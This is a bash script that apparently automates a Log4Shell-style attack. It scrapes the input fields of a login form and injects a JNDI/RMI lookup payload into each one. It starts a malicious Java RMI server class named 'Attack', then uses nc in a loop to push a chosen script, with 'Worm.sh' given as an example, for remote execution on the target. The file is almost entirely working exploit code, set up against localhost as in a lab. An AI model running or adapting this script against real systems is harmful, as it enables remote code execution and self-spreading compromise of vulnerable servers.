#!/bin/bash

if [ $# -ne 3 ]
then
	echo "Usage: ./Master_script.sh LOGIN_PAGE TARGET_URL SCRIPT_REMOTE_EXECUTION"
	echo "Eg: ./Master_script.sh localhost:8080 localhost:8080/login test_script_touch.sh"
	echo "Eg: ./Master_script.sh localhost:8080 localhost:8080/login Worm.sh"
	exit -1
fi

LOGIN_PAGE=$1
TARGET_URL=$2
SCRIPT=$3

JAVA_RMI_SERVER_LOCATION=`pwd` # OVERWRITE IT

# curl $LOGIN_PAGE > login.html

list=`curl $LOGIN_PAGE | awk '/<input/,/>/' | grep -Po 'name="\K[^"]*'`
# list=`curl $LOGIN_PAGE | awk "/<input/,/>/" | grep -Po "name=\"\K[^"]*"`

malicious_user="%24%7Bjndi%3Armi%3A%2F%2Flocalhost%3A1097%2FObject%7D" # ${jndi:rmi://localhost:1097/Object}

str_req=""

for element in $list
do
	new_field="${element}=$malicious_user"
	if [ ! -z "$str_req" ]
	then
		str_req="${str_req}&"
	fi
	str_req="${str_req}${new_field}"

done

# echo $str_req

# Start the attack itself:

cd $JAVA_RMI_SERVER_LOCATION ; java -cp tomcat-catalina-8.5.83.jar:. Attack & # as a child shell
JAVA_PID=$! # Special bash command

sleep 1 # Wait for the RMI server to be set up, otherwise it fails

curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d $str_req $TARGET_URL

# sleep 4 # We have to wait for nc. IF the next nc is executed after the listener in the victim, the following nc won't connect.

nc_exit_code=1

while [ "$nc_exit_code" -ne 0 ]; do
	sleep 1
#	echo $nc_exit_code
	cat $SCRIPT | nc -q 0 localhost 6969
	nc_exit_code=$?
done

kill -kill $JAVA_PID


